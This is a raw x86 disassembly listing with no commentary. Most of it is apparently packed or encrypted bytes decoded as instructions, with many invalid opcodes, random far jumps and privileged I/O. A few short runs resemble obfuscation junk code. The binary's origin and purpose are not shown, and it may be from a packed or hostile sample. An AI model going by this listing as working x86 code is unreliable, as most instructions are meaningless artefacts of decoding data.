  403bc1:	mov    edx,0xe8da3436
  403bc6:	sbb    bl,BYTE PTR [esi+0x36]
  403bc9:	adc    BYTE PTR [ebx],al
  403bcb:	jg     0x403bf3
  403bcd:	inc    esp
  403bce:	les    esi,FWORD PTR [ebx+0x381f762d]
  403bd4:	push   ds
  403bd5:	mov    ds,WORD PTR [edx]
  403bd7:	mov    edi,0xf8106e90
  403bdc:	neg    DWORD PTR [ebp-0x3a]
  403bdf:	mov    cl,0xaf
  403be1:	gs ret 0x167
  403be5:	mov    ah,0x6f
  403be7:	retf   
  403be8:	mov    ah,0xe5
  403bea:	(bad)  
  403bec:	enter  0x619b,0xc8
  403bf0:	mov    edx,0x8ef37db1
  403bf5:	adc    DWORD PTR [ebx+0x7c0aec0c],esi
  403bfb:	add    eax,0x1c820088
  403c00:	sub    eax,0x8b8c4e8f
  403c05:	dec    edx
  403c06:	cmp    eax,0x7a44462a
  403c0b:	add    BYTE PTR [eax-0x2],ah
  403c0e:	cwde   
  403c0f:	in     al,dx
  403c10:	jns    0x403c7c
  403c12:	pop    ss
  403c13:	mov    WORD PTR [ebx],cs
  403c15:	push   esi
  403c16:	sbb    edi,DWORD PTR [eax+0x617996f8]
  403c1c:	outs   dx,BYTE PTR ds:[esi]
  403c1d:	sub    dl,BYTE PTR [eax]
  403c1f:	fist   WORD PTR [ecx]
  403c21:	add    edx,esi
  403c23:	stos   BYTE PTR es:[edi],al
  403c24:	push   esi
  403c25:	xchg   esi,eax
  403c26:	es and al,bl
  403c29:	mov    WORD PTR [edi+0x4a1cffc5],cs
  403c2f:	jns    0x403bfd
  403c31:	(bad)  
  403c32:	in     al,dx
  403c33:	xor    al,0xb5
  403c35:	xchg   ebx,eax
  403c36:	(bad)  
  403c37:	(bad)  
  403c38:	jp     0x403bf7
  403c3a:	jbe    0x403cb1
  403c3c:	jle    0x403c32
  403c3e:	jbe    0x403c8e
  403c40:	jmp    0xd748:0xb6eb7137
  403c47:	sbb    bh,bl
  403c49:	sbb    eax,0x85ba1814
  403c4e:	test   al,0xdf
  403c50:	adc    BYTE PTR [esi+0x9],0x4
  403c54:	push   ds
  403c55:	adc    eax,0xca8a1ee5
  403c5a:	jle    0x403cd6
  403c5c:	rol    DWORD PTR [edi],cl
  403c5e:	inc    ebx
  403c5f:	xor    edx,ecx
  403c61:	sbb    BYTE PTR [ecx-0x52],al
  403c64:	scas   eax,DWORD PTR es:[edi]
  403c65:	jmp    0x2077:0xc6583d22
  403c6c:	ds in  al,0x3d
  403c6f:	inc    esp
  403c70:	mov    edx,DWORD PTR [ecx+ebx*1]
  403c73:	cmp    ebx,DWORD PTR [edx-0x20fdbb62]
  403c79:	dec    eax
  403c7a:	(bad)  
  403c7b:	cs jnp 0x403c91
  403c7e:	out    dx,eax
  403c7f:	add    al,0xc9
  403c82:	pop    ecx
  403c83:	cdq    
  403c84:	sahf   
  403c85:	dec    esp
  403c86:	push   ebp
  403c87:	call   0x55e5:0xca00c13
  403c8e:	ja     0x403c77
  403c90:	ja     0x403c3d
  403c92:	xchg   esp,eax
  403c93:	cmp    dl,BYTE PTR [ecx+0x7000c507]
  403c99:	stos   DWORD PTR es:[edi],eax
  403c9a:	je     0x403ca4
  403c9c:	mov    ch,0xa6
  403c9e:	scas   al,BYTE PTR es:[edi]
  403c9f:	pop    ss
  403ca0:	nop
  403ca1:	call   0x2dd1:0xd7a9a965
  403ca8:	sbb    BYTE PTR [ecx-0x39fb1a88],bl
  403cae:	pop    esi
  403caf:	cmc    
  403cb0:	and    DWORD PTR [edi+esi*2],esp
  403cb3:	fsub   QWORD PTR [eax-0x6e]
  403cb6:	push   cs
  403cb7:	add    BYTE PTR [ebp+0x633efbc6],dh
  403cbd:	inc    edx
  403cbe:	push   eax
  403cbf:	jp     0x403cc7
  403cc1:	cmc    
  403cc2:	ret    0x2e24
  403cc5:	pop    eax
  403cc6:	xor    eax,0xf7d7e2e
  403ccb:	nop
  403ccc:	sbb    eax,0xe1aa722b
  403cd1:	(bad)  
  403cd3:	mov    ah,0xf2
  403cd5:	test   BYTE PTR [ebx+0x6e],bh
  403cd8:	push   edi
  403cd9:	imul   edi,DWORD PTR [edx-0x2135c1e8],0x5
  403ce0:	lea    eax,[ebx]
  403ce2:	xor    eax,0xace394b1
  403ce7:	cli    
  403ce8:	test   bl,dh
  403cea:	loopne 0x403cf7
  403cec:	jp     0x403c75
  403cee:	pusha  
  403cef:	pop    ecx
  403cf0:	dec    eax
  403cf1:	retf   0xf49d
  403cf4:	sbb    BYTE PTR [esi],bh
  403cf6:	jns    0x403cfd
  403cf8:	xchg   ebx,eax
  403cf9:	mov    ecx,0x9d885509
  403cfe:	jnp    0x403d46
  403d00:	or     esp,DWORD PTR [ecx]
  403d02:	sbb    eax,ebx
  403d04:	call   0x95e94135
  403d09:	xchg   edx,eax
  403d0a:	test   al,0x42
  403d0c:	pop    ebp
  403d0d:	fs jl  0x403ca7
  403d10:	js     0x403cf3
  403d12:	or     eax,edi
  403d14:	ror    BYTE PTR [ebx-0x63],0x81
  403d18:	in     eax,0x3
  403d1a:	push   ebx
  403d1b:	mov    ds:0x9574d081,al
  403d20:	std    
  403d21:	das    
  403d22:	scas   al,BYTE PTR es:[edi]
  403d23:	fidivr DWORD PTR [eax-0x39]
  403d26:	push   edi
  403d27:	fimul  WORD PTR [eax+0x24b05190]
  403d2d:	(bad)  
  403d2e:	mov    al,0x56
  403d30:	test   eax,0xbc38ee6a
  403d35:	gs xchg edi,eax
  403d37:	add    dh,ch
  403d39:	dec    ebp
  403d3a:	push   edx
  403d3b:	and    ah,al
  403d3d:	mov    esi,0x9ef671d2
  403d42:	retf   
  403d43:	les    edi,FWORD PTR [esi-0x429b9bd6]
  403d49:	xor    edx,DWORD PTR [eax+0x53ad1a71]
  403d4f:	dec    eax
  403d50:	rep lods al,BYTE PTR ds:[esi]
  403d52:	mov    DWORD PTR [ebx],eax
  403d54:	(bad)  
  403d56:	sbb    eax,0x303dde26
  403d5b:	push   esp
  403d5c:	enter  0x97db,0xe7
  403d60:	mov    cl,0xf9
  403d62:	cmp    DWORD PTR [ebp-0x2],eax
  403d65:	cli    
  403d66:	mov    esi,0xff8ac1aa
  403d6b:	aad    0x9e
  403d6d:	or     eax,0x50108107
  403d72:	or     al,0xce
  403d74:	mov    ebx,0x3429d20
  403d79:	jno    0x403d19
  403d7b:	push   0xffffffca
  403d7d:	push   es
  403d7e:	pop    ecx
  403d7f:	test   BYTE PTR ss:[edx-0x111241ff],dl
  403d86:	and    eax,0x16e92794
  403d8b:	es sub al,0x97
  403d8e:	push   ss
  403d8f:	sub    bh,BYTE PTR [edx-0x194eee7d]
  403d95:	in     al,0x39
  403d97:	inc    edx
  403d98:	adc    edi,DWORD PTR [ecx]
  403d9a:	jo     0x403dc3
  403d9c:	test   al,0x92
  403d9e:	cmp    bl,BYTE PTR [edi+0x32ac891b]
  403da4:	int3   
  403da5:	shr    DWORD PTR [ebp+edx*1-0x6c],1
  403da9:	lds    edi,FWORD PTR [ebx-0x58ec610b]
  403daf:	or     al,0xdf
  403db1:	ins    BYTE PTR es:[edi],dx
  403db2:	xor    ecx,esp
  403db4:	jge    0x403d4a
  403db6:	cmp    eax,0x8552dfab
  403dbb:	cmc    
  403dbc:	xchg   edx,eax
  403dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403dbe:	fdiv   QWORD PTR [ebp+edx*8-0x48efd630]
  403dc5:	aaa    
  403dc6:	sub    al,0x2f
  403dc8:	adc    BYTE PTR [eax+0x716250ba],bl
  403dce:	mov    ds:0x5c4bf718,al
  403dd3:	xchg   ebp,eax
  403dd4:	iret   
  403dd5:	hlt    
  403dd6:	addr16 xchg esp,eax
  403dd8:	push   esi
  403dd9:	sbb    eax,0x489aef53
  403dde:	and    BYTE PTR [ebx-0x42022352],0xd3
  403de5:	sub    al,0xbb
  403de7:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  403de9:	mov    ch,0x4f
  403deb:	pop    esi
  403dec:	mov    ah,BYTE PTR [edx]
  403dee:	inc    edi
  403def:	inc    ebx
  403df0:	loope  0x403e45
  403df2:	aad    0x3
  403df4:	mov    bl,0xcd
  403df6:	or     ch,bh
  403df8:	(bad)  
  403df9:	clc    
  403dfa:	mov    dh,0x64
  403dfc:	adc    DWORD PTR [edi],ecx
  403dfe:	inc    esp
  403dff:	push   ebx
  403e00:	(bad)  
  403e01:	jp     0x403e13
  403e03:	out    dx,al
  403e04:	jo     0x403dca
  403e06:	popa   
  403e07:	cmp    esi,ebp
  403e09:	cmp    ax,0x7c
  403e0d:	push   esp
  403e0e:	sub    ah,BYTE PTR [eax+eax*1+0x31]
  403e12:	mov    esp,0x68384c3d
  403e17:	int    0xb1
  403e19:	fdiv   QWORD PTR [edi+ebx*2]
  403e1c:	daa    
  403e1d:	aad    0xf0
  403e1f:	pusha  
  403e20:	cli    
  403e21:	(bad)  
  403e22:	repz aaa 
  403e24:	xchg   edi,eax
  403e25:	push   es
  403e26:	fisttp QWORD PTR ds:0x5c212f64
  403e2c:	test   BYTE PTR [ecx+0x3e],dl
  403e2f:	mov    esp,0x97c02e73
  403e34:	jmp    0x403e14
  403e36:	fwait
  403e37:	or     eax,0x6e8ce7ec
  403e3c:	aam    0x48
  403e3e:	hlt    
  403e3f:	dec    ebx
  403e40:	jge    0x403e0b
  403e42:	sbb    al,0x2e
  403e44:	jo     0x403e49
  403e46:	mov    esp,0x3e6f0a0a
  403e4b:	mov    BYTE PTR [esi],dl
  403e4d:	outs   dx,BYTE PTR ds:[esi]
  403e4e:	pop    esp
  403e4f:	mov    ebp,0x2e6a72eb
  403e54:	pop    ebp
  403e55:	in     eax,dx
  403e56:	push   ebp
  403e57:	shl    DWORD PTR [esi-0x264fb072],0x46
  403e5e:	mov    ebx,0xa90eeaca
  403e63:	or     BYTE PTR [edi-0x57c04a81],al
  403e69:	(bad)  
  403e6a:	repz ret 0x8112
  403e6e:	mov    al,0x40
  403e70:	mov    esp,0x8d238399
  403e75:	pop    ss
  403e76:	mov    bl,0xb7
  403e78:	push   ds
  403e79:	dec    esi
  403e7a:	out    0xef,al
  403e7c:	sbb    BYTE PTR [ebp+0x24189c40],cl
  403e82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e83:	cmp    al,0xae
  403e85:	iret   
  403e86:	pop    eax
  403e87:	cmp    eax,0xd1d43992
  403e8c:	or     esi,ebx
  403e8e:	sti    
  403e8f:	mov    dh,0xb
  403e91:	mov    al,0x2a
  403e93:	stos   BYTE PTR es:[edi],al
  403e94:	push   0x61197f79
  403e99:	lods   eax,DWORD PTR ds:[esi]
  403e9a:	or     al,0x90
  403e9c:	mov    edx,0x82de58e1
  403ea1:	xor    al,0x15
  403ea3:	test   eax,0xafc78be2
  403ea8:	jge    0x403ef6
  403eaa:	das    
  403eab:	mov    bh,0x42
  403ead:	psubb  mm5,mm4
  403eb0:	scas   eax,DWORD PTR es:[edi]
  403eb1:	hlt    
  403eb2:	sub    eax,DWORD PTR [edi+0x20ca0456]
  403eb8:	scas   eax,DWORD PTR es:[edi]
  403eb9:	sub    bh,dl
  403ebb:	mov    esi,0x2ccf170a
  403ec0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ec1:	or     al,0x2b
  403ec3:	dec    BYTE PTR [edx]
  403ec5:	pop    ss
  403ec6:	adc    eax,0x8db01246
  403ecb:	xchg   edx,eax
  403ecc:	push   esp
  403ecd:	xchg   esp,eax
  403ece:	jmp    0x62ba:0x314e9096
  403ed5:	sub    BYTE PTR [ebx-0x34],bl
  403ed8:	ja     0x403ec7
  403eda:	jmp    0x32e259b8
  403edf:	(bad)  
  403ee0:	sti    
  403ee1:	cwde   
  403ee2:	add    eax,0x72b47ff4
  403ee7:	jmp    0x9fdfdcee
  403eec:	pop    eax
  403eed:	push   esi
  403eee:	ret    0xc4e6
  403ef1:	sub    edi,ecx
  403ef3:	cmp    DWORD PTR [ebx+0xc],ebx
  403ef6:	cmp    bh,ch
  403ef8:	test   al,0x8a
  403efa:	fldcw  WORD PTR [ebp+eiz*2-0x38]
  403efe:	ret    
  403eff:	inc    esi
  403f00:	aad    0x87
  403f02:	push   ebx
  403f03:	add    edx,DWORD PTR [ecx-0x7bfa6198]
  403f09:	pop    edx
  403f0a:	ins    DWORD PTR es:[edi],dx
  403f0b:	add    eax,DWORD PTR [ecx]
  403f0d:	sbb    DWORD PTR ds:0x4281cf,ebx
  403f13:	mov    DWORD PTR [ebp-0x14],eax
  403f16:	mov    ecx,DWORD PTR [ebx]
  403f18:	mov    eax,DWORD PTR [ebx+0x4]
  403f1b:	mov    edx,DWORD PTR ds:0x42824f
  403f21:	mov    edx,DWORD PTR [edx]
  403f23:	add    DWORD PTR ds:0x4283db,edx
  403f29:	shrd   ecx,eax,0x2
  403f2d:	sub    edx,0x9bd
  403f33:	shr    eax,0x2
  403f36:	and    eax,eax
  403f38:	mov    eax,DWORD PTR [ebx]
  403f3a:	and    DWORD PTR ds:0x428297,0x5c10
  403f44:	jmp    0x404322
  403f49:	sub    DWORD PTR [ecx-0x65e52424],0xffffff82
  403f50:	and    esi,esi
  403f52:	sbb    BYTE PTR [ecx-0x11fb0c44],ch
  403f58:	mov    esi,0x1818d7ce
  403f5d:	sahf   
  403f5e:	adc    bl,BYTE PTR [eax]
  403f60:	sbb    BYTE PTR [eax-0x50],bl
  403f63:	jne    0x403f5d
  403f65:	test   BYTE PTR [ecx-0x574a1437],ch
  403f6b:	stos   BYTE PTR es:[edi],al
  403f6c:	adc    edi,esp
  403f6e:	(bad)  
  403f70:	outs   dx,DWORD PTR ds:[esi]
  403f71:	pop    edx
  403f72:	repz dec ecx
  403f74:	js     0x403fe3
  403f76:	sahf   
  403f77:	adc    edi,esp
  403f79:	mov    ah,0xd2
  403f7b:	aad    0x45
  403f7d:	scas   eax,DWORD PTR es:[edi]
  403f7e:	fdiv   QWORD PTR [ecx-0x1f809b94]
  403f84:	outs   dx,BYTE PTR ds:[esi]
  403f85:	cdq    
  403f86:	(bad)  
  403f87:	ss mov bl,0xf
  403f8a:	test   BYTE PTR [edi-0x4a],ch
  403f8d:	shl    DWORD PTR [ebp-0x59123d38],0xa7
  403f94:	cwde   
  403f95:	fwait
  403f96:	aam    0xa9
  403f98:	xchg   ebp,eax
  403f99:	jg     0x403f55
  403f9b:	movhps xmm6,QWORD PTR [esi+0x7b]
  403f9f:	pop    es
  403fa0:	pop    ebp
  403fa1:	mov    ch,bl
  403fa3:	jp     0x403fcd
  403fa5:	adc    eax,0x54ff241
  403faa:	cwde   
  403fab:	cmp    eax,0xdb059dd1
  403fb0:	sbb    eax,0xafe7b133
  403fb5:	xchg   ebp,eax
  403fb6:	repnz sbb eax,0xe6128266
  403fbc:	test   DWORD PTR [esi+0x7c57960e],eax
  403fc2:	fwait
  403fc3:	adc    edi,edx
  403fc5:	inc    ebp
  403fc6:	lods   al,BYTE PTR ds:[esi]
  403fc7:	jo     0x40402d
  403fc9:	(bad)  
  403fca:	out    dx,al
  403fcb:	mov    edi,0x91943084
  403fd0:	mov    bh,0xc3
  403fd2:	dec    edx
  403fd3:	jg     0x404046
  403fd5:	or     dl,BYTE PTR [ebx]
  403fd7:	push   esp
  403fd8:	sahf   
  403fd9:	pop    ebx
  403fda:	and    eax,0x3779d7a1
  403fdf:	dec    esp
  403fe0:	and    BYTE PTR [esi-0x4d],bl
  403fe3:	into   
  403fe4:	sbb    BYTE PTR [edx-0x54355725],cl
  403fea:	or     BYTE PTR [ebp-0x4b],0x9
  403fee:	fdiv   st(3),st
  403ff0:	add    ch,ch
  403ff2:	jnp    0x403fa2
  403ff4:	cwde   
  403ff5:	imul   eax,DWORD PTR [esi+0x3a90ba93],0x5db91557
  403fff:	sbb    BYTE PTR [esi-0x65],0xaa
  404003:	sbb    al,BYTE PTR [ecx+0x44b4660c]
  404009:	add    al,0xda
  40400b:	inc    ebp
  40400c:	cmp    dh,BYTE PTR [ecx+0x18c69994]
  404012:	fistp  WORD PTR [edi-0x6c]
  404015:	div    DWORD PTR [esi+0x2c37c793]
  40401b:	ror    BYTE PTR [edi+0x6],0x7b
  40401f:	int    0x97
  404021:	jne    0x403fe3
  404023:	cli    
  404024:	mov    ch,0x8d
  404026:	dec    edx
  404027:	push   ss
  404028:	push   edx
  404029:	inc    ecx
  40402a:	lea    esp,[ebp-0x1d2aa224]
  404030:	rol    DWORD PTR [ebp-0x110c62bd],1
  404036:	or     ebp,DWORD PTR [ecx+0x160382f1]
  40403c:	das    
  40403d:	repnz mov dh,0x5f
  404040:	inc    edi
  404041:	cmp    eax,0xb1a4dc24
  404046:	pop    edi
  404047:	pop    eax
  404048:	nop
  404049:	xchg   ebp,eax
  40404a:	push   cs
  40404b:	aam    0x65
  40404d:	jl     0x404085
  40404f:	mov    edi,0x13387c1f
  404054:	or     edi,eax
  404056:	cmc    
  404057:	sub    DWORD PTR [ecx-0x2f4d2b1b],ebx
  40405d:	scas   eax,DWORD PTR es:[edi]
  40405e:	dec    ecx
  40405f:	int3   
  404060:	add    bl,ah
  404062:	dec    eax
  404063:	inc    esi
  404064:	cs cmp al,0xc2
  404067:	imul   ebx,DWORD PTR [ecx+0x5ae77aa5],0xffffff82
  40406e:	ret    
  40406f:	mov    ecx,?
  404071:	dec    esp
  404072:	xchg   ebx,esi
  404074:	mov    dh,0xca
  404076:	jg     0x4040ec
  404078:	pop    ds
  404079:	add    edi,ebx
  40407b:	push   cs
  40407c:	or     eax,0x56eadf2
  404081:	cmc    
  404082:	xor    DWORD PTR [edi+0x6c200653],ebp
  404088:	fwait
  404089:	sub    ch,cl
  40408b:	push   0xfffffff2
  40408d:	add    ebx,DWORD PTR [ecx+0x17]
  404090:	mov    ch,0x9b
  404092:	mov    ch,0x13
  404094:	jle    0x404036
  404096:	dec    esp
  404097:	jmp    0x40410a
  404099:	add    BYTE PTR [ecx],ch
  40409b:	add    ebp,esi
  40409d:	mov    esi,0x4248f4f2
  4040a2:	xchg   esp,eax
  4040a3:	cwde   
  4040a4:	js     0x4040dd
  4040a6:	or     al,0x3d
  4040a8:	aaa    
  4040a9:	cld    
  4040aa:	out    0xa4,eax
  4040ac:	aad    0xaa
  4040ae:	or     BYTE PTR [ecx+0x7442add1],0xc7
  4040b5:	jne    0x40407f
  4040b7:	hlt    
  4040b8:	inc    ecx
  4040b9:	aad    0xb2
  4040bb:	sti    
  4040bc:	cmp    DWORD PTR [edi],ebx
  4040be:	jge    0x4040b9
  4040c0:	sar    BYTE PTR [ebp-0x54],1
  4040c3:	xchg   edx,eax
  4040c4:	adc    BYTE PTR [ebp+0xd09964d],ah
  4040ca:	mov    cs,WORD PTR [eax]
  4040cc:	cmp    eax,0x82926003
  4040d1:	dec    ecx
  4040d2:	cmc    
  4040d3:	mov    ds:0xbe62036e,al
  4040d8:	jmp    0x2414:0x58aed1a5
  4040df:	dec    ebx
  4040e0:	xchg   ecx,eax
  4040e1:	xchg   ecx,eax
  4040e2:	inc    esi
  4040e3:	gs xchg ecx,eax
  4040e5:	test   BYTE PTR [eax+0x50],cl
  4040e8:	and    ch,BYTE PTR [edi]
  4040ea:	je     0x40408b
  4040ec:	pop    ebx
  4040ed:	fld    QWORD PTR [edx+eiz*2-0x74]
  4040f1:	xor    DWORD PTR [eax],ebx
  4040f3:	pop    es
  4040f4:	xor    BYTE PTR [ebx],cl
  4040f6:	inc    eax
  4040f7:	mov    BYTE PTR [edx+esi*2],dh
  4040fa:	dec    esi
  4040fb:	fsub   DWORD PTR [ecx]
  4040fd:	fnsave [edi]
  4040ff:	pop    esi
  404100:	xor    eax,0x1b9a60f3
  404105:	and    eax,0xfc9fd43c
  40410a:	or     ebp,DWORD PTR [ecx-0x43d65de4]
  404110:	xor    ebx,DWORD PTR [esi-0x39]
  404113:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404114:	in     eax,dx
  404115:	adc    eax,0xf1b06244
  40411a:	ret    0x80fc
  40411d:	inc    edx
  40411e:	ja     0x404141
  404120:	sbb    bl,bh
  404122:	mov    ebx,0x5fbd5d97
  404127:	sub    eax,0x7529ef3d
  40412c:	fdivp  st(7),st
  40412e:	stos   BYTE PTR es:[edi],al
  40412f:	add    BYTE PTR [eax+0x432e89cb],0x46
  404136:	add    eax,0x6175d536
  40413b:	fbstp  TBYTE PTR [esi+0x59]
  40413e:	in     al,0x9a
  404140:	or     ebx,DWORD PTR [ebp-0x1079ad9d]
  404146:	nop
  404147:	ret    
  404148:	xor    edx,DWORD PTR [ebp-0x509aaac1]
  40414e:	add    DWORD PTR [ebx+ecx*2+0x39acee05],ebx
  404155:	test   al,0x58
  404157:	cwde   
  404158:	jmp    0x73b1:0x4032d6b6
  40415f:	stc    
  404160:	hlt    
  404161:	ds (bad) 
  404163:	sahf   
  404164:	das    
  404165:	add    DWORD PTR [edi],0x43fdfc48
  40416b:	pop    eax
  40416c:	mov    ds:0xdfe5970b,al
  404171:	sbb    dh,BYTE PTR [ebp+0x7d]
  404174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404175:	xor    BYTE PTR [esi],ah
  404177:	inc    ebp
  404178:	push   esi
  404179:	add    DWORD PTR [ecx+ebp*8],edi
  40417c:	sub    dl,BYTE PTR [edi]
  40417e:	push   ss
  40417f:	or     dl,BYTE PTR [esi+0xc]
  404182:	mov    ds:0xe244d5d8,eax
  404187:	xor    eax,0xe27ed765
  40418c:	mov    BYTE PTR [ebx],0x44
  40418f:	ror    bl,1
  404191:	imul   esp,DWORD PTR [eax-0x80]
  404195:	pop    eax
  404196:	push   ds
  404197:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404198:	enter  0xe4e1,0xe2
  40419c:	xchg   edi,eax
  40419d:	pop    es
  40419e:	rol    DWORD PTR es:[ebx],0xb3
  4041a2:	cwde   
  4041a3:	mov    ch,0x81
  4041a5:	sar    DWORD PTR [ebx-0x4ea27376],1
  4041ab:	scas   al,BYTE PTR es:[edi]
  4041ac:	adc    DWORD PTR [ebx-0x56],esp
  4041af:	(bad)  
  4041b0:	sar    BYTE PTR [edi+0x6d109f83],1
  4041b6:	(bad)  
  4041b7:	xor    al,ch
  4041b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041ba:	add    eax,0xd4394a3c
  4041bf:	mov    bl,0x23
  4041c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041c2:	scas   eax,DWORD PTR es:[edi]
  4041c3:	pop    ss
  4041c4:	out    dx,al
  4041c5:	and    BYTE PTR [eax-0x2837b1bb],0x8a
  4041cc:	push   esi
  4041cd:	call   0x9dcdfe9e
  4041d2:	pop    es
  4041d3:	(bad)  
  4041d4:	test   al,0x28
  4041d6:	je     0x404211
  4041d8:	ins    BYTE PTR es:[edi],dx
  4041d9:	adc    bl,ah
  4041db:	pop    esi
  4041dc:	es pop esi
  4041de:	push   ebx
  4041df:	push   cs
  4041e0:	adc    al,0x14
  4041e2:	sub    eax,0xb2a07fb3
  4041e7:	mov    ecx,0x719eff2e
  4041ec:	scas   eax,DWORD PTR es:[edi]
  4041ed:	or     dl,BYTE PTR [ebp-0x22724092]
  4041f3:	ins    BYTE PTR es:[edi],dx
  4041f4:	jmp    0x404232
  4041f6:	dec    edi
  4041f7:	cmp    esp,DWORD PTR [edx+0x20e7f98d]
  4041fd:	push   ds
  4041fe:	popa   
  4041ff:	icebp  
  404200:	xor    al,0xbf
  404202:	adc    eax,0xd2919d6f
  404207:	std    
  404208:	jno    0x404207
  40420a:	fwait
  40420b:	push   ecx
  40420c:	ins    DWORD PTR es:[edi],dx
  40420d:	call   0x8ab5bba3
  404212:	jne    0x404269
  404214:	push   es
  404215:	addps  xmm2,xmm2
  404218:	adc    BYTE PTR [eax+eiz*1+0x7e],dh
  40421c:	pop    ds
  40421d:	das    
  40421e:	cmc    
  40421f:	mov    esp,0xdfca53f5
  404224:	xchg   ecx,eax
  404225:	inc    ebx
  404226:	aaa    
  404227:	add    al,0x52
  404229:	mov    esp,0x3b0a5529
  40422e:	iret   
  40422f:	in     al,0x82
  404231:	test   al,0x4d
  404233:	push   es
  404234:	and    al,0x95
  404236:	fnstenv [eax+0x45a31f0]
  40423c:	inc    eax
  40423d:	push   ebx
  40423e:	nop
  40423f:	fwait
  404240:	ss jne 0x404256
  404243:	(bad)  
  404244:	fidivr DWORD PTR [edi-0x41]
  404247:	lock fsub st,st(4)
  40424a:	dec    ecx
  40424b:	jbe    0x4042b4
  40424d:	push   edx
  40424e:	inc    edi
  40424f:	mov    al,0x7d
  404251:	bound  ecx,QWORD PTR [eax+eax*1]
  404254:	mov    al,0x55
  404256:	xchg   edi,eax
  404257:	push   esp
  404258:	jge    0x4042d7
  40425a:	fiadd  WORD PTR [edi-0x78]
  40425d:	ins    DWORD PTR es:[edi],dx
  40425e:	nop
  40425f:	push   cs
  404260:	xchg   ebx,eax
  404261:	or     ebp,edx
  404263:	int3   
  404264:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404265:	dec    ax
  404267:	or     eax,0xbff3de18
  40426c:	push   ss
  40426d:	jno    0x404271
  40426f:	aad    0xe4
  404271:	xlat   BYTE PTR ds:[ebx]
  404272:	pmaxsw mm5,QWORD PTR [edx-0x5e]
  404276:	(bad)  
  404277:	or     cl,dh
  404279:	(bad)  
  40427a:	mov    bh,0xab
  40427c:	fld    TBYTE PTR [eax-0x1f872daa]
  404282:	sbb    al,0x48
  404284:	in     eax,dx
  404285:	push   ds
  404286:	push   ebx
  404287:	aaa    
  404288:	adc    eax,0xc1066ec9
  40428d:	repz mov ebp,0x2f1b4677
  404293:	xlat   BYTE PTR ds:[ebx]
  404294:	mov    esi,0x4e63dfd
  404299:	rol    BYTE PTR [ecx],0x68
  40429c:	lods   al,BYTE PTR ds:[esi]
  40429d:	mov    cl,0x9c
  40429f:	sbb    BYTE PTR [eax],bh
  4042a1:	in     al,dx
  4042a2:	int    0x8f
  4042a4:	cmp    DWORD PTR [esi-0x52152339],0xd17de259
  4042ae:	je     0x4042d3
  4042b0:	pop    ebx
  4042b1:	add    eax,0x7448fa76
  4042b6:	and    BYTE PTR ds:0x8cd0069b,al
  4042bc:	pop    ss
  4042bd:	dec    esp
  4042be:	adc    esp,DWORD PTR [esi+0x64]
  4042c1:	adc    BYTE PTR [ebx-0x3f7d3dbf],dh
  4042c7:	pushf  
  4042c8:	call   0x1091:0x6206
  4042ce:	(bad)  
  4042d0:	cmp    al,BYTE PTR [eax+0xff3cd5b]
  4042d6:	xchg   BYTE PTR [edi+0x35bc9432],al
  4042dc:	aas    
  4042dd:	and    eax,0x1a012b8e
  4042e2:	jge    0x40428a
  4042e4:	or     DWORD PTR [edx+0x2],ebx
  4042e7:	mov    eax,esp
  4042e9:	mov    ds:0xb8647527,eax
  4042ee:	int    0xaa
  4042f0:	in     al,dx
  4042f1:	dec    eax
  4042f2:	fdivrp st(3),st
  4042f4:	xor    BYTE PTR gs:[ebx],cl
  4042f7:	adc    DWORD PTR [edx],ebx
  4042f9:	mov    ebp,0xcf73ba73
  4042fe:	fst    QWORD PTR [edi-0x21d42fe0]
  404304:	or     BYTE PTR [ecx],cl
  404306:	outs   dx,BYTE PTR ds:[esi]
  404307:	icebp  
  404308:	enter  0x1858,0xb0
  40430c:	in     eax,dx
  40430d:	adc    esp,DWORD PTR [ecx]
  40430f:	neg    esi
  404311:	stc    
  404312:	push   es
  404313:	(bad)  
  404314:	das    
  404315:	dec    BYTE PTR [ebx]
  404317:	push   0x519ebc13
  40431c:	aaa    
  40431d:	cmc    
  40431e:	cmp    ecx,esi
  404320:	jmp    0x493ceda
  404325:	and    DWORD PTR ds:0x42829b,ebx
  40432b:	xor    ecx,edi
  40432d:	or     edx,DWORD PTR ds:0x4282cb
  404333:	shl    eax,0x1e
  404336:	and    edx,DWORD PTR ds:0x428347
  40433c:	xor    eax,eax
  40433e:	mov    edx,DWORD PTR ds:0x428287
  404344:	and    DWORD PTR ds:0x4283e7,edx
  40434a:	or     eax,ecx
  40434c:	mov    ecx,DWORD PTR [ebx]
  40434e:	movzx  edx,BYTE PTR ds:0x4283cf
  404355:	sbb    DWORD PTR ds:0x4282db,edx
  40435b:	mov    edx,DWORD PTR [ebx+0x4]
  40435e:	jmp    0x40473c
  404363:	xchg   BYTE PTR [eax+ebp*4],ch
  404366:	xchg   edx,eax
  404367:	call   0x1412:0x951c227a
  40436e:	stos   BYTE PTR es:[edi],al
  40436f:	xchg   ecx,eax
  404370:	adc    al,0xbf
  404372:	mov    al,0x55
  404374:	iret   
  404375:	sbb    BYTE PTR [eax],bl
  404377:	sahf   
  404378:	adc    bl,BYTE PTR [eax]
  40437a:	sbb    BYTE PTR [eax-0x7ce4b16],ah
  404380:	iret   
  404381:	outs   dx,BYTE PTR ds:[esi]
  404382:	add    bl,BYTE PTR [ebx+0x7c]
  404385:	add    bl,BYTE PTR [ebp+0x9ef1276]
  40438b:	mov    bl,0x45
  40438d:	add    edi,esi
  40438f:	mov    ebp,0x8c528b95
  404394:	(bad)  
  404395:	xor    eax,DWORD PTR ds:0xaee8cac2
  40439b:	adc    eax,0xc038e33e
  4043a0:	lods   eax,DWORD PTR ds:[esi]
  4043a1:	fstp   DWORD PTR [edi+esi*2+0x1d]
  4043a5:	pop    esp
  4043a6:	push   ebx
  4043a7:	add    DWORD PTR [ecx-0x74],0xffffff91
  4043ab:	mov    bh,0x58
  4043ad:	pop    es
  4043ae:	sbb    DWORD PTR [eax],ecx
  4043b0:	pop    eax
  4043b1:	push   es
  4043b2:	xlat   BYTE PTR ds:[ebx]
  4043b3:	stc    
  4043b4:	fild   QWORD PTR [eax-0x6c]
